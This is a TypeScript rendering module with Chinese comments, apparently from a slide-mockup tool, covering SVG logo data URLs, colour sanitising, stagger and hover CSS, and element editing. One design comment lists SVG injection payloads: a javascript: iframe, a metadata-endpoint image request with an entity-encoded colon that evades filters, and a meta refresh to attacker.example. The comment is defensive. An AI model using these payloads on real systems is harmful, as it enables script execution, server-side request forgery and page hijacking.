  };
  const w = dim(attrValue(attrs, 'width'));
  const h = dim(attrValue(attrs, 'height'));
  const size = [w && `width:${w}`, h && `height:${h}`].filter(Boolean).join('; ');
  const style = mergeStyle(attrValue(attrs, 'style'), size);
  // id 也要带过去：模型的 CSS 可能按 `#id` 定位，丢了它版式会塌
  return `<span${id === null ? '' : ` id="${escapeHtml(id)}"`}${cls === null ? '' : ` class="${escapeHtml(cls)}"`}${style ? ` style="${style}"` : ''}>`;
}

/** 重建开标签：摘掉槽位属性，其余属性一个字不动 */
function rebuildOpen(open: string): string {
  const m = /^<([a-zA-Z][\w-]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>$/.exec(open);
  if (!m) return open;
  const attrs = withoutSlotAttr(m[2] ?? '');
  const rest = attrs.replace(/(^|\s)style\s*=\s*("[^"]*"|'[^']*'|[^\s"'>]+)/i, '');
  const style = mergeStyle(attrValue(attrs, 'style'), '');
  return `<${m[1]}${rest}${style ? ` style="${style}"` : ''}>`;
}

/** 取一个开标签的属性段。取不到就返回空串 */
function openAttrs(open: string): string {
  return /^<[a-zA-Z][\w-]*((?:"[^"]*"|'[^']*'|[^>"'])*)>$/.exec(open)?.[1] ?? '';
}

/** 把一段声明并到已有的内联样式后面。已有值里的双引号要转义，否则会拼出非法属性 */
function mergeStyle(current: string | null, add: string): string {
  const parts = [current?.trim().replace(/;?$/, '') ?? '', add].filter((s) => s !== '');
  return parts.join('; ').replace(/"/g, '&quot;');
}

/**
 * 把单色稿里的 `currentColor` 烘成品牌色。
 *
 * **为什么不继续用 `color: var(--brand)` + `currentColor` 继承。**
 * 那条路要求稿是**内联**进 HTML 文档的，而内联意味着它过的是 **HTML 解析器**，不是 XML 解析器。
 * HTML 的 foreign content 规则里，`<desc>` / `<title>` 是**集成点**（子标记按 HTML 解析），
 * `<img>` / `<div>` / `<meta>` 这些 start tag 会**把解析器从 SVG 里弹出来**，变成页面上真正的
 * HTML 元素。于是这些 payload 都能通过任何「拒绝清单」式的校验、逐字节落进库：
 *
 * - `<desc><iframe src="javascript:parent.__pwned=1"></iframe></desc>` —— 导出时**无交互执行 JS**；
 * - `<img src="http&#58;//169.254.169.254/latest/meta-data/">` —— 从**服务器**发起对外请求
 *   （数值字符引用让原文里根本不出现 `http://`，正则看不见，浏览器看得见）；
 * - `<meta http-equiv="refresh" content="0;url=http&#58;//attacker.example/">` —— 整页被导航走，
 *   导出出来的 PDF/PPTX 拍的是攻击者的页面。
 *
 * 这不是「再补几条规则」能修的：正则看的是原文，浏览器看的是**重新解析后**的结果，
 * 中间隔着实体解码、空白规范化、CSS 转义一整个规范化层。
 *
 * 改成 `<img src="data:image/svg+xml,…">` 之后，浏览器把这份稿当**静态图片**加载：
 * 脚本不执行、外部子资源一律不加载、也跳不出成 HTML 标记。上面三类 payload 全部失效
 * （实测 22 条 payload 在这个形态下零执行、零请求）。代价就是图片里的 SVG 拿不到外面的 CSS，
 * 所以颜色必须在这里烘进去。
 *
 * 顺带一个好处：「用原图」那条路本来就已经是 `<img>` 了，两个分支现在同一个形状。
 */
function colorizeSvg(svg: string, brandColor: string): string {
  return svg.replace(/currentColor/gi, brandColor);
}

/**
 * 品牌色的兜底：认不出是颜色就退回黑色。
 *
 * `StylePalette.brand` 是裸 `z.string()`（`packages/ir-schema/src/style-doc.ts:124-142`），
 * **没有任何颜色格式校验**，而这个值是要被**替换进 SVG 源码**的。实测两种坏结果，都不报错：
 *
 * - `var(--brand)` / `currentColor` → 图片能加载，但颜色是**黑色**（图片文档里没有自定义属性
 *   可继承，「logo 跟着品牌色走」直接失效）；
 * - `#06c<b` → SVG 变成非法 XML → **整张图加载失败**（`onerror`、`naturalWidth === 0`），
 *   页眉上什么都没有。
 *
 * 所以认得出才用。只认 `#hex` 与 `rgb()/hsl()` 这一类：**命名色一律不收**——
 * `none` 之类的值会让 logo 静默变成不可见，而本仓的风格配色本来就是十六进制。
 */
function safeColor(value: string): string {
  const v = value.trim();
  if (/^#(?:[0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i.test(v)) return v;
  if (/^(?:rgb|rgba|hsl|hsla)\(\s*[0-9.,%\s/deg]+\)$/i.test(v)) return v;
  return '#000';
}

/** SVG 的命名空间。稿要当图片加载就必须带它，见 `ensureXmlns` */
const SVG_NS = 'http://www.w3.org/2000/svg';

/**
 * 保证**根标签**带**正确的** `xmlns`。
 *
 * **这不是可选项，是硬依赖。** 稿是以 `<img src="data:image/svg+xml,…">` 加载的，而这条路上
 * 浏览器按 **XML** 解析它：根元素不在 SVG 命名空间里就不是 SVG，**整张图加载失败**。
 * 实测（真 Chromium）：不带 xmlns → `onerror`、`naturalWidth === 0`；补上 → 150×150 正常画出来。
 * 而失败时接口不报错、日志没有异常，用户只看到「重绘成功」加一个空页眉。
 *
 * **在代码里补，不让模型写。** 与图位那条「不让模型写 src」同一个道理——模型漏一次就静默坏一页，
 * 而这件事几行代码就能保证。历史稿（提示词还写着「不要写 xmlns」那段时间落库的）也一并兜住。
 *
 * **判据必须限定在根标签上、并且看值**，不能只问「整篇里出现过 `xmlns=`」——
 * 那样下面三种稿会被跳过、产出画不出来的图片（实测都是 `naturalWidth === 0`）：
 * 注释或文本里含 `xmlns=`、`xmlns=""`（空命名空间）、`xmlns` 指向别的命名空间。
 *
 * 而且**根标签要按「第一个元素」去找**，不能取全文第一个 `<svg`：注释里完全可以先出现一个
 * 完整的假开标签（`<!-- <svg viewBox="0 0 1 1"> -->`），那样 xmlns 会被补进注释、真根标签
 * 仍然是空的，图片照样加载不出来。所以先跳过根标签前面允许出现的东西（空白、注释、XML 声明、
 * DOCTYPE），再从那里找 `<svg`。
 */
const BEFORE_ROOT = /^(?:\s|<!--[\s\S]*?-->|<\?xml[^>]*\?>|<!DOCTYPE[^>]*>)*/i;

function ensureXmlns(svg: string): string {
  const head = BEFORE_ROOT.exec(svg)![0];
  const m = /<svg\b[^>]*>/i.exec(svg.slice(head.length));
  // 连根标签都找不到就不动它——这种稿 `validateLogoSvg` 已经拦掉了
  if (!m) return svg;

  const at = head.length + m.index;
  const tag = m[0];
  const found = /\sxmlns\s*=\s*("[^"]*"|'[^']*')/i.exec(tag);
  // 已经是对的：不改写、也不补第二遍（重复的 xmlns 会让 XML 非法，同样加载失败）
  if (found && found[1]!.slice(1, -1) === SVG_NS) return svg;

  // 有但是错的就改写它，没有才插。`xmlns:xlink=` 不会命中这个正则，那不算默认命名空间
  const fixed = found
    ? tag.replace(found[0], ` xmlns="${SVG_NS}"`)
    : tag.replace(/<svg\b/i, `<svg xmlns="${SVG_NS}"`);
  return svg.slice(0, at) + fixed + svg.slice(at + tag.length);
}

/**
 * 把落库的重绘稿变成一个能直接塞进 `src` 的 data URL。
 *
 * **整个仓库只允许这一处构造它。** 页面渲染、导出、面板预览都调这个函数——手搓第二份
 * 一定会漏掉这里的某一步（补 xmlns、烘品牌色、色值兜底），而漏掉任何一步都是静默失效：
 * 图片加载不出来、或者颜色不对，接口与日志都不说话。
 *
 * `brandColor` 传当前风格包的 `palette.brand`。
 */
export function brandLogoDataUrl(svg: string, brandColor: string): string {
  const colored = colorizeSvg(svg, safeColor(brandColor));
  return `data:image/svg+xml;charset=utf-8,${encodeURIComponent(ensureXmlns(colored))}`;
}

/** 槽位该填什么。返回 `null` 表示这个槽位没有值、整个元素删掉 */
function slotValue(kind: BrandSlotKind, brand: BrandSlot, brandColor: string): string | null {
  if (kind === 'logo') {
    if (brand.svg) {
      return `<img src="${brandLogoDataUrl(brand.svg, brandColor)}" alt="" style="display:block;width:100%;height:100%;object-fit:contain">`;
    }
    if (brand.imageSrc) return `<img src="${escapeHtml(brand.imageSrc)}" alt="" style="display:block;width:100%;height:100%;object-fit:contain">`;
    return null;
  }
  if (kind === 'name') return brand.name ? escapeHtml(brand.name) : null;
  if (kind === 'tagline') return brand.tagline ? escapeHtml(brand.tagline) : null;
  return null;
}

/* ---------------- 元素逐块进场 ---------------- */

/**
 * 容器上的标记属性，**值是进场方向**。
 *
 * 方向只写在容器上、靠自定义属性继承传给所有后代，keyframe 里用 `var()` 取值——
 * 自定义属性在 keyframe 内部是按元素解析的，继承生效。于是四种方向只要四条一行的
 * 规则加一个关键帧，不用给每个元素都挂一个方向属性。
 */
export const STAGGER_ATTR = 'data-lumen-stagger';

/** 元素上的标记属性。带这个属性的元素才会播进场动画 */
export const STAGGER_ITEM_ATTR = 'data-stagger-item';

/** 四种进场方向。按页序号轮换，连续几页看上去不一样 */
export const STAGGER_DIRECTIONS = ['up', 'left', 'right', 'scale'] as const;
export type StaggerDirection = (typeof STAGGER_DIRECTIONS)[number];

/** 相邻两个元素的进场间隔（ms）。与 `@lumen/motion` 的 FLIP_MS 是两个用途，别混 */
export const STAGGER_STEP_MS = 70;

/**
 * 延迟排到第几个就封顶。
 *
 * 一页三十个元素挨个进要两秒，那时候观众已经在看下一页了。夹住之后第九个往后一起进：
 * 总时长有上界，也不会出现「一部分元素立刻可见、另一部分还在等」的半吊子状态
 * （半个容器有延迟、另一半没有，看着像卡住了）。
 */
export const STAGGER_DELAY_CLAMP = 8;

/** 标记数封顶。再往后都落在夹住的延迟上，标了也没有区别，白白多几百个动画 */
export const STAGGER_MAX_ITEMS = 24;

/** 容器至少要有几个元素子节点才值得逐块。只有一个的话跟整体淡入没区别 */
const STAGGER_MIN_CHILDREN = 2;

/** 递归分配序号时往下看几层。再深的容器是页面局部，不是「一页分几块」 */
const STAGGER_MAX_DEPTH = 4;

/** 不产生子节点的标签，扫描时不计入 */
const VOID_TAGS = new Set([
  'area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input',
  'link', 'meta', 'param', 'source', 'track', 'wbr',
]);

/** 按种子挑一个进场方向。负数种子（向前翻页）也要落回合法范围 */
export function staggerDirectionFor(seed: number): StaggerDirection {
  const n = STAGGER_DIRECTIONS.length;
  return STAGGER_DIRECTIONS[((seed % n) + n) % n]!;
}

/**
 * 逐块进场的整套 CSS，注入到这一份文档里。
 *
 * **不依赖主文档的样式表**：新链路的内容跑在 iframe 里，加载不到
 * `packages/slides/src/styles.css`。那份给旧渲染器用，两边内容几乎一样——
 * `packages/slides` 有一条测试读这份 CSS 与那份原文，比对关键帧名与夹取上限，
 * 防它们漂开。
 *
 * ## 进场动画绝不能碰页面作者自己用的属性
 *
 * 三条规矩，都是实测踩出来的（一页「谢谢」整块跑到画布右下角、水印变成实心块）：
 *
 * **一、动 `translate`/`scale` 独立属性，不动 `transform` 简写。**
 * 动画里的 `transform` 会**整个替换**元素自己的 `transform` 声明（动画优先级高于普通声明），
 * 而模型写的页面经常用 `transform: translate(-50%, -50%)` 居中——那一块于是退回
 * `left:50%; top:50%` 的原始位置，右下各多出半块。`translate`/`scale` 是独立的属性，
 * 按规范与 `transform` 相乘叠加（顺序是 translate → rotate → scale → transform），
 * 所以作者的居中照样生效，进场位移只是叠在它外面。
 *
 * **二、`to` 留空。**
 * 关键帧里没写的属性会取元素自身的值，所以留空等于「从 0 淡入、从偏移落回**它本来的样子**」：
 * 水印的 `opacity: .05` 保持 5%，用 `translate` 定位的元素落回它自己的位移。
 * `to` 里写下的每一条，都是动效层从页面手里抢走的一条。
 *
 * **三、除了 opacity / translate / scale，什么都不许动。**
 * 混进 `filter` 会凭空造出包含块，把绝对定位的后代整块挪位；`width`、`position` 之类更不用说。
 *
 * 这三条都属于「编辑器里看着好好的、某些页才炸」那一类，改回去不会立刻报错，
 * 所以 `stagger-css.test.ts` 里有断言盯着。
 */
export const STAGGER_CSS = [
  '@keyframes lumen-stagger-in {',
  '  from { opacity: 0; translate: var(--stagger-x, 0px) var(--stagger-y, 12px); scale: var(--stagger-s, 1); }',
  // 空的关键帧是**故意的**：终态交给元素自己，见上面第二条
  '  to   { }',
  '}',
  `[${STAGGER_ITEM_ATTR}] {`,
  '  animation: lumen-stagger-in 240ms var(--ease-out, cubic-bezier(0.2,0,0,1)) both;',
  `  animation-delay: calc(min(var(--stagger-i, 0), ${STAGGER_DELAY_CLAMP}) * ${STAGGER_STEP_MS}ms);`,
  '}',
  `[${STAGGER_ATTR}="up"]    { --stagger-x: 0px;   --stagger-y: 12px; }`,
  `[${STAGGER_ATTR}="left"]  { --stagger-x: 18px;  --stagger-y: 0px; }`,
  `[${STAGGER_ATTR}="right"] { --stagger-x: -18px; --stagger-y: 0px; }`,
  `[${STAGGER_ATTR}="scale"] { --stagger-x: 0px;   --stagger-y: 0px; --stagger-s: 0.96; }`,
].join('\n');

/**
 * 「正在生成」时用的：把元素标出来，但**先都藏起来**，由外层逐个点亮。
 *
 * 与 `STAGGER_CSS` 是同一套标记（`markStaggerItems` 给的阅读序），区别只有一个：
 * 那条自带 `animation`，页面一渲染就自己从头播到尾；这一条**不自播**，
 * 只把 `[data-stagger-item]` 压成透明，等外层把某一个的 `style.opacity` 翻成 1。
 *
 * **为什么复用 `data-stagger-item` 而不是另起一个属性**：阅读序那套递归分配
 * （容器占号、纯装饰层跳过）是这个仓库里唯一一份「一页分成哪几块、按什么顺序」的判定，
 * 再写一份迟早与进场动效的次序对不上，而那种不一致没人会去查。
 *
 * `transition` 留着是为了让逐个点亮是「淡入」而不是「啪一下出现」——
 * 它由外层的赋值驱动，不是自己会跑的东西。
 */
export const REVEAL_CSS = [
  `[${STAGGER_ITEM_ATTR}] {`,
  '  opacity: 0;',
  '  transition: opacity 220ms var(--ease-out, cubic-bezier(0.2,0,0,1));',
  '}',
].join('\n');

/**
 * 导出与打印用：把这一份文档里的动效全按死。
 *
 * 加了逐块进场之后，截图有可能拍在一排元素半透明地停在半路上的样子。
 * 旧链路的 `ctx.mode === 'export'` 是同一件事的另一半。
 */
export const STATIC_CSS = '*, *::before, *::after { animation: none !important; transition: none !important; }';

/**
 * 鼠标滑到图位上的反馈：抬起、稍微放大、投影。
 *
 * **只在「看样机」的场合开**（`PageDocumentOptions.hover`），默认关：工作台画布里
 * 用户正在图位上拖拽，图会跟着鼠标抬起来只会碍事；导出是截图，也轮不到它。
 *
 * ## 一、动的是图位的**父元素**，不是图位自己
 *
 * 实测骨架里约 95% 的图位外面套着一个 `overflow: hidden` 的裁剪框
 * （`people-skeletons.ts` 的 `.person`、`image-skeletons.ts` 里 55 处），
 * 而 `.person img` 本身就是框宽的 3.5 倍、**已经在被裁**。效果挂在 `<img>` 上的话，
 * 放大与投影全画在裁剪区外，规则写了也看不见。所以用 `:has(> …)` 挑中那个裁剪框，
 * 动它——框一动，里面的图跟着动，裁剪边界也跟着走。
 *
 * ## 二、`body > *` 前缀是必需的
 *
 * 页面根元素（骨架里是 `.page`）也可能正好是图位的直接父元素，不排除的话
 * 鼠标一进画面整页就抬起来。`body > *` 那一层是根元素自己，它**不在** `:has()` 的
 * 后代位置上，天然被排除；再往下才是我们要的裁剪框。
 *
 * ## 三、只能用 `translate` / `scale` 长写，不能用 `transform` 简写
 *
 * 骨架大量用 `transform` 做定位与旋转（`translate(-50%,-50%)`、
 * `perspective(…) rotateY(…)`、`rotate(±5deg)`），而简写是**整体替换**——
 * 写进去就把作者那一条整条抹掉，元素当场跳位。与 `STAGGER_CSS` 同一条理由，
 * 那边也是为这个用长写。
 *
 * ## 四、不写 `position: relative`
 *
 * 同样会覆盖骨架里 `absolute` 的定位。`z-index` 对静态元素本就是空操作，留着不伤；
 * 放大的框可能被后面的兄弟压住几像素边缘，不值得为它冒元素跳位的险。
 *
 * ## 五、不画描边
 *
 * 试过 `outline: 2px solid var(--accent)`，**去掉了**：骨架的图位形状五花八门
 * （圆形头像、六边形头像、带 `clip-path` 的斜切色块），而 `outline` 跟的是
 * border-box，圆头像上会显出一个方框，比不加还难看。靠抬起与投影就够看出反馈了。
 */
export const HOVER_CSS = [
  /*
    **`.ui-screen` 要排除在外。** 界面页的骨架里，设备屏幕也是一个图位
    （`<div class="ui-screen"><img data-lumen-image="1"></div>`），
    于是它会命中下面这条规则、悬停时被抬起 6px 并放大 4%——而它身上还挂着
    把屏幕贴到机身斜面上的 `matrix3d`。两者一叠加，屏幕就从机身上飘走了。
    设备自己有抬起与转动（见 `ui-layouts.ts`），屏幕跟着机身走就行，不要再单独动。
  */
  `body > * :has(> [${IMAGE_SLOT_ATTR}]):not(.ui-screen) {`,
  '  transition: translate 200ms var(--ease-out, cubic-bezier(0.2,0,0,1)),',
  '              scale 200ms var(--ease-out, cubic-bezier(0.2,0,0,1)),',
  '              box-shadow 200ms var(--ease-out, cubic-bezier(0.2,0,0,1));',
  '}',
  `body > * :has(> [${IMAGE_SLOT_ATTR}]):not(.ui-screen):hover {`,
  '  translate: 0 -6px;',
  '  scale: 1.04;',
  '  box-shadow: 0 18px 44px color-mix(in srgb, var(--text) 26%, transparent);',
  '  z-index: 5;',
  '}',
  // 这段 CSS 注入在 iframe 里，主文档那条 `prefers-reduced-motion` 够不到，得自带一份
  '@media (prefers-reduced-motion: reduce) {',
  `  body > * :has(> [${IMAGE_SLOT_ATTR}]):not(.ui-screen) { transition: none; }`,
  '}',
].join('\n');

interface TagNode {
  tag: string;
  /** 开标签在片段里的区间。标记要插进这个区间里 */
  openStart: number;
  openEnd: number;
  /** 闭合标签的起点。模型漏写闭合时退到片段末尾 */
  closeStart: number;
  /** 嵌套深度。用来挑「一页分成哪几块」那一层 */
  depth: number;
  /** 空元素（img / br）。它们没有闭合标签，内容判定要单独看 */
  voidNode: boolean;
  children: TagNode[];
}

/** 空元素里算「内容」的只有这几个。`<br>` / `<hr>` 这类是排版用的，不单独进场 */
const CONTENT_VOID_TAGS = new Set(['img', 'video', 'canvas']);

/**
 * 扫一遍片段里的标签，**按文档序**返回每个元素，并记下它在字符串里的区间。
 *
 * 区间是给「定点补丁」用的：`openStart/openEnd` 是开标签那一段（改属性要插在中间），
 * `closeStart` 是闭合标签的起点（改内容是 `openEnd..closeStart` 那一段）。
 *
 * 几处不那么直觉的地方：
 *
 * - **属性段允许带引号的 `>`**（`style="a>b"`），所以不能简单地匹配到第一个 `>`。
 * - **空元素（img / br）算父节点的子节点，但不压进栈**——它们是真实内容，该跟着一起
 *   进场；压进去的话后面的兄弟会被算成它们的孩子，真正的容器就挑不出来。
 * - **模型漏写闭合标签时不配对就跳过**，宁可少算一个元素，也不能让栈错位、
 *   把补丁打到别的元素上。被弹掉的那几个把 `closeStart` 退到片段末尾，
 *   与「后面全算它的内容」一致。
 *
 * 这是启发式，不是解析器：仓库里没有 HTML 解析库，`fillImageSlots` / `fillBrandSlots`
 * 也都是这个路数。
 */
function scanTags(fragment: string): TagNode[] {
  const all: TagNode[] = [];
  const stack: TagNode[] = [];
  const re = /<(\/?)([a-zA-Z][\w-]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;

  let m: RegExpExecArray | null;
  while ((m = re.exec(fragment)) !== null) {
    const tag = (m[2] ?? '').toLowerCase();
    if (m[1] === '/') {
      const at = stack.map((n) => n.tag).lastIndexOf(tag);
      if (at >= 0) {
        for (let i = at; i < stack.length; i += 1) stack[i]!.closeStart = m.index;
        stack.length = at;
      }
      continue;
    }
    const parent = stack[stack.length - 1];
    const selfClosing = (m[3] ?? '').trimEnd().endsWith('/');
    const isVoid = VOID_TAGS.has(tag) || selfClosing;
    const node: TagNode = {
      tag,
      openStart: m.index,
      openEnd: m.index + m[0].length,
      // 空元素没有闭合标签，它的「内容」就是它自己；非空元素先退到片段末尾，等闭合时再收紧
      closeStart: isVoid ? m.index + m[0].length : fragment.length,
      depth: stack.length,
      voidNode: isVoid,
      children: [],
    };
    if (parent) parent.children.push(node);
    all.push(node);
    if (isVoid) continue;
    stack.push(node);
  }
  return all;
}

/**
 * 给一页标上「元素逐块进场」。
 *
 * **这是启发式，不是解析。** HTML 是模型写的，我们不知道它用什么类名、几层嵌套，
 * 而 `HtmlMock` 的 iframe **有意不开 `allow-scripts`**（开了就等于让模型产出的内容
 * 能在应用同源上下文里执行代码），所以没法在运行时问 DOM。
 *
 * 两步：
 * 1. 找「一页分成哪几块」的那层容器——元素子节点数 ≥ 2、层级最浅的那个。
 *    取最浅的是因为「一页分几块」那一层几乎总在上面；再往下钻就只能框住卡片组自己，
 *    标题会突兀地先蹦出来。
 * 2. 从那层开始**递归分配阅读序**：容器的每个子节点依次拿下一个序号，然后钻进子节点
 *    继续分配。`stage > [header, main > [h1, p, cards > [c1,c2,c3]]]` 会得到
 *    `header=0, main=1, h1=2, p=3, cards=4, c1=5, c2=6, c3=7`——正是阅读序。
 *    容器自己也占一个序号：它们是透明的盒子，多一层动画看不出来，但少了它们就会
 *    出现「父块整块先落定、子块再补」的断层。
 *
 * 一个容器都挑不到就原样返回：那一页退化成整体淡入。**这是设计好的降级**，
 * 不是失败——页面照常显示，只是没有逐块进场。
 */
export function markStaggerItems(fragment: string, direction: StaggerDirection): string {
  /** 所有元素节点。挑容器要跨层级找，不能只看顶层 */
  const all = scanTags(fragment);

  /**
   * 这块里面有没有真东西（文字或图）。
   *
   * 判它是因为**纯装饰层不该单独进场**：实测一页封面的 `div.canvas` 底下是
   * `[span.glow--tl, span.glow--br, img.bg-image, span.bg-scrim, header, main, footer]`，
   * 按顺序标下来，最先动的是两团光晕——背景比内容先亮，看着像页面加载了两遍。
   * 按「子树里有文字或图」筛一道，留下的就是真正的内容块。
   */
  const hasContent = (node: TagNode): boolean => {
    if (node.voidNode) return CONTENT_VOID_TAGS.has(node.tag);
    const inner = fragment.slice(node.openEnd, node.closeStart);
    if (/<img\b/i.test(inner)) return true;
    return inner.replace(/<[^>]*>/g, ' ').trim().length > 0;
  };

  // 元素子节点数够多、层级最浅的那个容器就是「一页分成哪几块」那一层。
  // 取最浅的是因为再往下钻就只能框住卡片组自己，标题会突兀地先蹦出来
  const root = all
    .filter((n) => n.children.length >= STAGGER_MIN_CHILDREN && n.children.some(hasContent))
    .sort((a, b) => a.depth - b.depth || b.children.length - a.children.length)[0];
  if (!root) return fragment;

  // 序号 → 要改的那个开标签。用 openStart 当键，回填时按位置倒序才不会打乱后面的偏移
  const marks: { node: TagNode; index: number }[] = [];
  const walk = (node: TagNode, depth: number) => {
    if (depth > STAGGER_MAX_DEPTH || node.children.length < STAGGER_MIN_CHILDREN) return;
    for (const child of node.children) {
      if (marks.length >= STAGGER_MAX_ITEMS) return;
      // 纯装饰层跳过、且不占号：它该一开始就在，不该把内容的进场往后推
      if (!hasContent(child)) continue;
      marks.push({ node: child, index: marks.length });
      walk(child, depth + 1);
    }
  };
  walk(root, 0);
  if (marks.length === 0) return fragment;

  let out = fragment;
  for (const { node, index } of marks.sort((a, b) => b.node.openStart - a.node.openStart)) {
    const open = out.slice(node.openStart, node.openEnd);
    out = out.slice(0, node.openStart) + withStaggerItem(open, index) + out.slice(node.openEnd);
  }
  // 方向标在最外层容器上，靠继承传给所有后代
  const open = out.slice(root.openStart, root.openEnd);
  return out.slice(0, root.openStart) + withStaggerDirection(open, direction) + out.slice(root.openEnd);
}

/** 给一个开标签挂上 `data-stagger-item` 与 `--stagger-i`，已有的属性一个不动 */
function withStaggerItem(tag: string, index: number): string {
  const styleRe = /\bstyle\s*=\s*(["'])([\s\S]*?)\1/i;
  const found = styleRe.exec(tag);
  const withStyle = found
    // 已有的 style 追加而不是覆盖——模型可能在里面写了 object-fit 这类东西
    ? tag.replace(styleRe, (_all, q: string, body: string) =>
      `style=${q}${body.trim().replace(/;?$/, ';')}--stagger-i:${index}${q}`)
    : tag.replace(/^<[a-zA-Z][\w-]*/, (t) => `${t} style="--stagger-i:${index}"`);
  return withStyle.replace(/^<[a-zA-Z][\w-]*/, (t) => `${t} ${STAGGER_ITEM_ATTR}`);
}

/** 给容器挂上方向。已经有这个属性就不动 */
function withStaggerDirection(tag: string, direction: StaggerDirection): string {
  if (new RegExp(`\\b${STAGGER_ATTR}\\b`, 'i').test(tag)) return tag;
  return tag.replace(/^<[a-zA-Z][\w-]*/, (t) => `${t} ${STAGGER_ATTR}="${direction}"`);
}

/* ---------------- 元素级编辑 ---------------- */

/**
 * 元素的定位标记。**只在渲染期存在，不进存下来的 mockHtml**——
 * 它跟 `data-lumen-slot` 是同一类东西：给界面一个抓手，不是样机的一部分。
 */
export const ELEMENT_INDEX_ATTR = 'data-lumen-el';

export interface ElementEdit {
  /** 元素在片段里的**文档序**，即 `markElementIndex` 盖的那个号 */
  index: number;
  /** 平移量，画布像素（1920×1080 那一套坐标） */
  dx?: number;
  dy?: number;
  /** 换掉这个元素的文字内容。**调用方要保证它是纯文本元素**，见 `applyElementEdits` */
  text?: string;
}

/**
 * 给每个元素的开标签盖 `data-lumen-el="n"`，n 是**文档序**。
 *
 * 编辑时要能从「用户点中的那个 DOM 元素」找回「它在原始字符串里是第几个元素」。
 * 不给标记的话只能靠遍历顺序去猜，而渲染链路中间还有 `fillImageSlots` 插了一手。
 *
 * **倒序回填**：插入属性会让后面所有下标右移，从最后一个元素往前改，
 * 前面那些元素的区间才不会被挤偏。
 */
export function markElementIndex(fragment: string): string {
  const all = scanTags(fragment);
  let out = fragment;
  for (let i = all.length - 1; i >= 0; i -= 1) {
    const node = all[i]!;
    const open = out.slice(node.openStart, node.openEnd);
    if (new RegExp(`\\b${ELEMENT_INDEX_ATTR}\\b`, 'i').test(open)) continue;
    out = out.slice(0, node.openStart)
      + open.replace(/^<[a-zA-Z][\w-]*/, (t) => `${t} ${ELEMENT_INDEX_ATTR}="${i}"`)
      + out.slice(node.openEnd);
  }
  return out;
}

/**
 * 把一组元素编辑**定点打到原始片段上**。
 *
 * ## 为什么不改活 DOM 再序列化
 *
 * 编辑时确实直接改 iframe 里的元素（那样才跟手），但**存下来的不是序列化结果**。
 * 渲染链路会往 HTML 上盖东西——`fillImageSlots` 盖 `src` / `data-lumen-slot` /
 * `data-lumen-cutout`，`markStaggerItems` 盖 `data-stagger-item`——序列化再还原要同时
 * 处理「图位填不上时 `<img>` 被换成 `<div>`」这类情形，很脆；而且一旦漏还原，
 * 写死的图片地址就静默进了风格库，再被当样本喂给「统一风格」的提示词，
 * 模型会学着写死 src（`lintMockHtml` 的外部资源检查只认 `url(https?:)`，裸 `src=` 它不拦）。
 *
 * 所以改的始终是**原始 mockHtml**，一次序列化都不做。
 *
 * ## 两条规矩
 *
 * **一、只写 `translate` 独立属性，不碰 `transform` 简写。** 两者是相乘合成的
 * （顺序 translate → rotate → scale → transform），所以追加 `translate` 不会抹掉模型
 * 自己的 `transform:translate(-50%,-50%)` 居中；写成简写就是整体替换，元素当场跳位。
 * 与 `STAGGER_CSS`、`SlotHandles` 同一条理由。
 *
 * **二、`text` 只对纯文本元素用。** 它换的是 `openEnd..closeStart` 整段，元素里若还有
 * 子元素，那些子元素会被一起抹掉。空元素（img / br）没有内容区间，直接跳过。
 *
 * 倒序应用：改一个元素的长度会挤偏它后面所有元素的区间。
 */
export function applyElementEdits(fragment: string, edits: ElementEdit[]): string {
  if (edits.length === 0) return fragment;
  const all = scanTags(fragment);
  const ordered = [...edits].sort(
    (a, b) => (all[b.index]?.openStart ?? -1) - (all[a.index]?.openStart ?? -1),
  );

  let out = fragment;
  for (const edit of ordered) {
    const node = all[edit.index];
    if (!node) continue;
    // 先改文字再改开标签：文字那一段在开标签**之后**，先动它不会挤偏 openStart/openEnd
    let next = out;
    if (edit.text !== undefined && !node.voidNode) {
      const escaped = edit.text.replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]!));
      next = next.slice(0, node.openEnd) + escaped + next.slice(node.closeStart);
    }
    if (edit.dx !== undefined || edit.dy !== undefined) {
      const open = next.slice(node.openStart, node.openEnd);
      next = next.slice(0, node.openStart)
        + appendTranslate(open, edit.dx ?? 0, edit.dy ?? 0)
        + next.slice(node.openEnd);
    }
    out = next;
  }
  return out;
}

/**
 * 往开标签的 `style` 末尾追加一条 `translate`。
 *
 * **追加在后**而不是覆盖整条 `style`：模型可能在里面写了 `object-fit`、`left` 这类
 * 定位相关的声明，整条换掉会把版式搞塌。同一条 `style` 里后面的声明优先，
 * 所以追加也压得过模型自己写的 `translate`。
 */
function appendTranslate(tag: string, dx: number, dy: number): string {
  const decl = `translate: ${dx}px ${dy}px`;
  const styleRe = /\bstyle\s*=\s*(["'])([\s\S]*?)\1/i;
  const found = styleRe.exec(tag);
  if (!found) return tag.replace(/^<[a-zA-Z][\w-]*/, (t) => `${t} style="${decl}"`);
  return tag.replace(styleRe, (_all, q: string, body: string) =>
    `style=${q}${body.trim().replace(/;?$/, ';')}${decl}${q}`);
}

/* ---------------- 文字段：把一页的文字列出来、改回去 ---------------- */

/**
 * 页面里的一段可编辑文字。
 *
 * ## 为什么按「文本节点」而不是按「元素」分段
 *
 * 想当然的做法是「一个元素一条」，编辑时换掉它的 `textContent`。但模型写的页面里
 * **混排很常见**——实测抓到的真实页面里就有 `<p><strong>来源可查</strong>：Palantir 在
 * 2020 年的 S-1 招股书中，…</p>` 和 `<div>FDE 交付节奏<br>进场 · 落地 · 扩展 · 移交</div>`。
 * 按元素换 `textContent` 会把这些子元素**一起抹掉**，加粗没了、换行也没了，
 * 而界面上不会报任何错——用户只是发现「改完字之后这一行变样了」。
 *
 * 按文本节点分段就不会动结构：改的只是某一段文字本身。
 */
export interface TextRun {
  /** 文档序。`applyTextRuns` 按同一个序回填 */
  i: number;
  /** 这一段的内容，**实体已解码**（`&amp;` 显示成 `&`） */
  text: string;
  /** 它所在元素的标签名，界面用来标「这是个标题还是个段落」 */
  tag: string;
  /** 在所在元素里排第几段（从 0 起） */
  ordinal: number;
  /** 所在元素一共几段。**多于一段时界面才需要标序号**，否则一个标题标个「第 1 段」很吵 */
  siblings: number;
}

/** 这些元素里的文字不是给人看的，不算「页面上的文字」 */
const SKIP_TEXT_TAGS = new Set(['style', 'script', 'title']);

interface RawRun {
  start: number;
  end: number;
  tag: string;
